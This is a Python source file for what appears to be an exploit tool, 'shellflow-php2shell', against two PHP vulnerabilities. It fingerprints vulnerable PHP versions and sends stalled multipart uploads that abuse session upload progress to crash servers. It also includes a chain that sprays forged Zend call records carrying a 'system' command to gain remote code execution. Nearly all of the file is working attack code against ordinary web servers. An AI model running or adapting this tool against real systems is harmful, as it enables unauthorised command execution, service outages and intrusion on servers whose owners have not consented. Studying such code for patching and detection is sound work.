from __future__ import annotations

import json
import re
import socket
import ssl
import struct
import uuid
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlparse

CVE_IDS = ("CVE-2026-109618", "CVE-2026-109619")

FIX_VERSIONS: dict[str, tuple[int, ...]] = {
    "8.2": (8, 2, 35),
    "8.3": (8, 3, 36),
    "8.4": (8, 4, 27),
    "8.5": (8, 5, 12),
}

FILLUNIT = 5120
DEFAULT_BOUNDARY_TRIGGER = b"----shellflow-php2shell"
DEFAULT_PROGRESS_KEY = "shellflow_poc"

N149_SPRAY = 149
FORGE_BLOB = 288
DELTA_CALL_DEFAULT = 0x43EF0  # build-specific
BOUNDARY_619 = b"B7kQpoc619"


@dataclass
class Target:
    scheme: str
    host: str
    port: int
    path: str = "/"

    @classmethod
    def from_url(cls, url: str) -> Target:
        u = urlparse(url if "://" in url else "http://" + url)
        scheme = (u.scheme or "http").lower()
        host = u.hostname or "127.0.0.1"
        if u.port is not None:
            port = u.port
        elif scheme == "https":
            port = 443
        else:
            port = 80
        path = u.path or "/"
        if not path.startswith("/"):
            path = "/" + path
        return cls(scheme=scheme, host=host, port=port, path=path)

    def base(self) -> str:
        if (self.scheme == "http" and self.port == 80) or (
            self.scheme == "https" and self.port == 443
        ):
            return f"{self.scheme}://{self.host}"
        return f"{self.scheme}://{self.host}:{self.port}"

    def with_path(self, path: str) -> Target:
        p = path if path.startswith("/") else "/" + path
        return Target(self.scheme, self.host, self.port, p)


@dataclass
class ParsedPhpVersion:
    major: int
    minor: int
    patch: int
    patch_known: bool

    def as_tuple(self) -> tuple[int, int, int]:
        return self.major, self.minor, self.patch

    def as_str(self) -> str:
        if self.patch_known:
            return f"{self.major}.{self.minor}.{self.patch}"
        return f"{self.major}.{self.minor}.?"


def parse_php_version(text: str) -> tuple[int, int, int] | None:
    parsed = parse_php_version_detailed(text)
    return parsed.as_tuple() if parsed else None


def parse_php_version_detailed(text: str) -> ParsedPhpVersion | None:
    if not text:
        return None
    m = re.search(r"PHP\s*/?\s*(\d+)\.(\d+)(?:\.(\d+))?", text, re.I)
    if not m:
        return None
    major, minor = int(m.group(1)), int(m.group(2))
    patch_known = m.group(3) is not None
    patch = int(m.group(3)) if patch_known else 0
    ver = (major, minor, patch)
    if not is_plausible_php_version(ver):
        return None
    return ParsedPhpVersion(major, minor, patch, patch_known)


def is_plausible_php_version(ver: tuple[int, int, int]) -> bool:
    major, minor, _patch = ver
    if major < 4 or major > 8:
        return False
    if major == 8 and minor > 5:
        return False
    if major == 7 and minor > 4:
        return False
    return True


def version_tuple(v: tuple[int, ...]) -> tuple[int, int, int]:
    return v[0], v[1], v[2] if len(v) > 2 else 0


def is_vulnerable_php(
    ver: tuple[int, int, int] | None,
    *,
    patch_known: bool = True,
) -> bool | None:
    if ver is None:
        return None
    if not patch_known:
        return None
    major, minor, patch = ver
    if major < 5:
        return False
    if major == 8 and minor == 0:
        return None
    if major == 8 and minor == 1:
        return None
    key = f"{major}.{minor}"
    fix = FIX_VERSIONS.get(key)
    if fix is None:
        if major >= 5:
            return True
        return False
    return ver < fix


def multipart_part(
    boundary: bytes, name: str, body: bytes, filename: str | None = None
) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


MICRO_BOUNDARY = b"----b"


def build_micro_trigger_multipart(
    session_id: str,
    *,
    boundary: bytes = MICRO_BOUNDARY,
    progress_key: str = "x",
) -> tuple[bytes, bytes]:
    b = boundary.decode("ascii")
    h = f"--{b}\r\n"
    body = (
        h
        + 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + session_id
        + "\r\n"
        + h
        + 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + progress_key
        + "\r\n"
        + h
        + 'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
        + "Z\r\n"
        + f"--{b}--\r\n"
    ).encode("ascii")
    return body, boundary


def build_session_injection_multipart(
    session_id: str,
    filename: str,
    *,
    boundary: bytes = b"----shellflow-inject",
    progress_key: str = "x",
) -> tuple[bytes, bytes]:
    parts = b""
    parts += multipart_part(boundary, "PHPSESSID", session_id.encode()) + b"\r\n"
    parts += multipart_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", progress_key.encode()) + b"\r\n"
    parts += multipart_part(boundary, "f", b"Z", filename=filename) + b"\r\n"
    parts += b"--" + boundary + b"--\r\n"
    return parts, boundary


def parse_set_cookie_session(headers: dict[str, str], session_id: str) -> bool:
    raw = headers.get("set-cookie", "")
    if not raw:
        return False
    sid = session_id.lower()
    return sid in raw.lower() and "phpsessid" in raw.lower()


def build_trigger_multipart(
    session_id: str,
    *,
    boundary: bytes = DEFAULT_BOUNDARY_TRIGGER,
    progress_key: str = DEFAULT_PROGRESS_KEY,
    phase1_extra: int = 128,
    phase2_multiplier: int = 2,
) -> tuple[bytes, bytes, bytes, int]:
    hdr = multipart_part(boundary, "PHPSESSID", session_id.encode()) + b"\r\n"
    hdr += multipart_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", progress_key.encode()) + b"\r\n"
    hdr += (
        b"--"
        + boundary
        + b"\r\n"
        + b'Content-Disposition: form-data; name="file"; filename="poc.bin"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\n"
    )
    p1_size = FILLUNIT + phase1_extra
    p2_size = FILLUNIT * phase2_multiplier
    chunk_a = b"A" * p1_size
    chunk_b = b"B" * p2_size
    tail = b"\r\n--" + boundary + b"--\r\n"
    phase1 = hdr + chunk_a
    phase2 = chunk_b + tail
    total = len(phase1) + len(phase2)
    return phase1, phase2, boundary, total


def forge_zend_call_record(call_addr: int, command: bytes) -> bytes:
    rec = bytearray(FORGE_BLOB)
    fci = 64
    is_string_ex = 0x106
    is_object_ex = 0x308
    zend_internal = 1
    struct.pack_into("<Q", rec, 0, fci)
    struct.pack_into("<Q", rec, 8, call_addr)
    struct.pack_into("<I", rec, 16, is_string_ex)
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, zend_internal)
    struct.pack_into("<Q", rec, 64 + 88, call_addr)
    struct.pack_into("<I", rec, 160, is_object_ex)
    sysb = b"system\x00" + command + b"\x00"
    rec[200 : 200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def build_rce619_multipart(
    session_id: str,
    command: bytes,
    call_addr: int,
    *,
    boundary: bytes = BOUNDARY_619,
    spray_count: int = N149_SPRAY,
) -> tuple[bytes, bytes, dict[str, Any]]:
    spray = forge_zend_call_record(call_addr, command)
    if boundary in spray:
        raise ValueError("forge blob collided with multipart boundary")
    pre = b""
    pre += multipart_part(boundary, "PHPSESSID", session_id.encode()) + b"\r\n"
    pre += multipart_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    for _ in range(spray_count):
        pre += multipart_part(boundary, "t[]", spray) + b"\r\n"
    pre += multipart_part(boundary, "f", b"", filename="a") + b"\r\n"
    c1 = b"A" * (FILLUNIT + 64)
    phase1 = pre + c1
    c2 = b"B" * (FILLUNIT + 64)
    c3 = b"C" * (FILLUNIT + 64)
    phase2 = c2 + c3 + b"\r\n--" + boundary + b"--\r\n"
    meta = {
        "chain": "109619",
        "phase1_len": len(phase1),
        "total_len": len(phase1) + len(phase2),
        "spray_count": spray_count,
        "call_addr": hex(call_addr),
    }
    return phase1, phase2, meta


def send_all(sock: socket.socket, data: bytes) -> None:
    view = memoryview(data)
    sent = 0
    while sent < len(data):
        n = sock.send(view[sent:])
        if n == 0:
            raise ConnectionError("socket closed during send")
        sent += n


def open_connection(target: Target, timeout: float = 30.0) -> socket.socket:
    raw = socket.create_connection((target.host, target.port), timeout=timeout)
    raw.settimeout(timeout)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if target.scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(raw, server_hostname=target.host)
        ss.settimeout(timeout)
        return ss
    return raw


def recv_http_response(
    sock: socket.socket,
    timeout: float = 25.0,
    max_bytes: int = 24_576,
    body_cap: int = 8_192,
) -> bytes:
    sock.settimeout(timeout)
    buf = bytearray()
    header_end: int | None = None
    while len(buf) < max_bytes:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, TimeoutError, ssl.SSLError, OSError):
            break
        if not chunk:
            break
        buf.extend(chunk)
        if header_end is None and b"\r\n\r\n" in buf:
            header_end = buf.index(b"\r\n\r\n") + 4
        if header_end is not None and len(buf) >= header_end + body_cap:
            break
    return bytes(buf)


def parse_http_status(raw: bytes) -> tuple[int, str, bytes, dict[str, str]]:
    headers: dict[str, str] = {}
    if not raw or b"\r\n" not in raw:
        return 0, "no response", b"", headers
    head, _, rest = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status_line = lines[0].decode("latin-1", "replace")
    parts = status_line.split(" ", 2)
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    reason = parts[2] if len(parts) >= 3 else ""
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            headers[k.decode("latin-1", "replace").lower()] = v.decode(
                "latin-1", "replace"
            ).strip()
    return code, reason, rest, headers


def http_get(target: Target, path: str, timeout: float = 10.0) -> tuple[int, bytes, dict[str, str]]:
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {target.host}\r\n"
        f"Connection: close\r\n"
        f"User-Agent: shellflow-php2shell/1.0\r\n\r\n"
    ).encode()
    sock = open_connection(target, timeout=timeout)
    try:
        send_all(sock, req)
        raw = recv_http_response(sock, timeout=timeout)
    finally:
        try:
            sock.close()
        except Exception:
            pass
    code, _, body, hdrs = parse_http_status(raw)
    return code, body, hdrs


def http_get_safe(
    target: Target, path: str, timeout: float = 10.0
) -> tuple[int, bytes, dict[str, str], str | None]:
    try:
        code, body, hdrs = http_get(target, path, timeout=timeout)
        return code, body, hdrs, None
    except Exception as exc:
        return 0, b"", {}, f"{type(exc).__name__}: {exc}"


def decode_chunked(body: bytes) -> bytes:
    if not body or b"\r\n" not in body:
        return body
    first = body.split(b"\r\n", 1)[0].strip()
    if not first or not all(c in b"0123456789abcdefABCDEF" for c in first):
        return body
    chunks: list[bytes] = []
    raw = body
    while raw:
        if b"\r\n" not in raw:
            break
        line, raw = raw.split(b"\r\n", 1)
        sz = int(line.strip(), 16) if line.strip() else 0
        if sz == 0:
            break
        chunks.append(raw[:sz])
        raw = raw[sz:]
        if raw.startswith(b"\r\n"):
            raw = raw[2:]
    return b"".join(chunks) if chunks else body


@dataclass
class TriggerResult:
    session_id: str
    status: int
    reason: str
    body: bytes
    headers: dict[str, str] = field(default_factory=dict)
    armed: bool = False
    bytes_processed: int | None = None
    crashed: bool = False
    progress_key: str = DEFAULT_PROGRESS_KEY
    variant: str = "stall"
    path: str = "/"
    session_fixation: bool = False
    elapsed_sec: float = 0.0

    def success_heuristic(self, expect: bytes | None = None) -> bool:
        if expect and expect in self.body:
            return True
        if self.armed:
            return True
        if self.crashed:
            return True
        return False


def stalled_multipart_post(
    target: Target,
    phase1: bytes,
    phase2: bytes,
    session_id: str,
    *,
    boundary: bytes,
    stall: float,
    progress_key: str = DEFAULT_PROGRESS_KEY,
    timeout: float = 30.0,
    cookie_header: bool = True,
    variant: str = "stall",
) -> TriggerResult:
    import time as _time

    total = len(phase1) + len(phase2)
    cookie_line = f"Cookie: PHPSESSID={session_id}\r\n" if cookie_header else ""
    head = (
        f"POST {target.path} HTTP/1.1\r\n"
        f"Host: {target.host}\r\n"
        f"{cookie_line}"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {total}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    t0 = _time.time()
    sock = open_connection(target, timeout=timeout)
    try:
        send_all(sock, head + phase1)
        _time.sleep(stall)
        send_all(sock, phase2)
        raw = recv_http_response(sock, timeout=timeout)
    finally:
        try:
            sock.close()
        except Exception:
            pass

    code, reason, body, hdrs = parse_http_status(raw)
    crashed = code in (0, 502, 503) or not raw
    fixation = parse_set_cookie_session(hdrs, session_id)

    return TriggerResult(
        session_id=session_id,
        status=code,
        reason=reason,
        body=body,
        headers=hdrs,
        armed=False,
        bytes_processed=None,
        crashed=crashed,
        progress_key=progress_key,
        variant=variant,
        path=target.path,
        session_fixation=fixation,
        elapsed_sec=_time.time() - t0,
    )


def single_multipart_post(
    target: Target,
    body: bytes,
    session_id: str,
    *,
    boundary: bytes,
    timeout: float = 30.0,
    cookie_header: bool = True,
    variant: str = "micro",
) -> TriggerResult:
    import time as _time

    cookie_line = f"Cookie: PHPSESSID={session_id}\r\n" if cookie_header else ""
    head = (
        f"POST {target.path} HTTP/1.1\r\n"
        f"Host: {target.host}\r\n"
        f"{cookie_line}"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    t0 = _time.time()
    sock = open_connection(target, timeout=timeout)
    try:
        send_all(sock, head + body)
        raw = recv_http_response(sock, timeout=timeout)
    finally:
        try:
            sock.close()
        except Exception:
            pass
    code, reason, resp_body, hdrs = parse_http_status(raw)
    crashed = code in (0, 502, 503) or not raw
    return TriggerResult(
        session_id=session_id,
        status=code,
        reason=reason,
        body=resp_body,
        headers=hdrs,
        crashed=crashed,
        variant=variant,
        path=target.path,
        session_fixation=parse_set_cookie_session(hdrs, session_id),
        elapsed_sec=_time.time() - t0,
    )


def run_trigger_618(
    target: Target,
    *,
    stall: float = 1.5,
    rounds: int = 1,
    timeout: float = 30.0,
    cookie_header: bool = True,
) -> list[TriggerResult]:
    out: list[TriggerResult] = []
    for _ in range(rounds):
        sid = f"sf618_{uuid.uuid4().hex[:16]}"
        p1, p2, boundary, _ = build_trigger_multipart(sid)
        res = stalled_multipart_post(
            target,
            p1,
            p2,
            sid,
            boundary=boundary,
            stall=stall,
            timeout=timeout,
            cookie_header=cookie_header,
            variant="stall",
        )
        out.append(res)
    return out


def run_trigger_micro(
    target: Target,
    *,
    timeout: float = 15.0,
    cookie_header: bool = True,
) -> TriggerResult:
    sid = f"sfmic_{uuid.uuid4().hex[:16]}"
    body, boundary = build_micro_trigger_multipart(sid)
    return single_multipart_post(
        target,
        body,
        sid,
        boundary=boundary,
        timeout=timeout,
        cookie_header=cookie_header,
        variant="micro",
    )


def run_session_injection_probe(
    target: Target,
    *,
    canary: str = "shellflow_canary.txt",
    timeout: float = 15.0,
) -> TriggerResult:
    sid = f"sfinj_{uuid.uuid4().hex[:16]}"
    body, boundary = build_session_injection_multipart(sid, canary)
    return single_multipart_post(
        target,
        body,
        sid,
        boundary=boundary,
        timeout=timeout,
        cookie_header=False,
        variant="inject",
    )


def resolve_call_addr(dtor: int | None, call: int | None) -> int:
    if call is not None and call > 0:
        return call & 0xFFFFFFFFFFFFFFFF
    if dtor is not None and dtor > 0:
        return (dtor - DELTA_CALL_DEFAULT) & 0xFFFFFFFFFFFFFFFF
    return 0


def run_exploit_619(
    target: Target,
    command: str,
    *,
    session_id: str | None = None,
    stall: float = 1.35,
    call_addr: int,
) -> TriggerResult:
    if call_addr <= 0:
        raise ValueError("109619 RCE requires --call or --dtor (build-specific)")
    sid = session_id or f"sf619_{uuid.uuid4().hex[:16]}"
    p1, p2, _meta = build_rce619_multipart(sid, command.encode(), call_addr)
    return stalled_multipart_post(
        target,
        p1,
        p2,
        sid,
        boundary=BOUNDARY_619,
        stall=stall,
        progress_key="x",
    )


def fingerprint_target(target: Target, timeout: float = 10.0) -> dict[str, Any]:
    code, body, hdrs, err = http_get_safe(target, target.path, timeout=timeout)
    powered = hdrs.get("x-powered-by", "")
    server = hdrs.get("server", "")
    parsed = parse_php_version_detailed(powered)
    version_source = "header" if parsed else None
    if not parsed and body:
        parsed = parse_php_version_detailed(body.decode("latin-1", "replace")[:8192])
        if parsed:
            version_source = "body"
    ver = parsed.as_tuple() if parsed else None
    patch_known = parsed.patch_known if parsed else False
    vuln = is_vulnerable_php(ver, patch_known=patch_known) if parsed else None
    row: dict[str, Any] = {
        "target": target.base() + target.path,
        "http_status": code,
        "x_powered_by": powered,
        "server": server,
        "php_version": parsed.as_str() if parsed else None,
        "php_patch_known": patch_known if parsed else None,
        "likely_vulnerable": vuln,
    }
    if version_source:
        row["php_version_source"] = version_source
    if err:
        row["error"] = err
    return row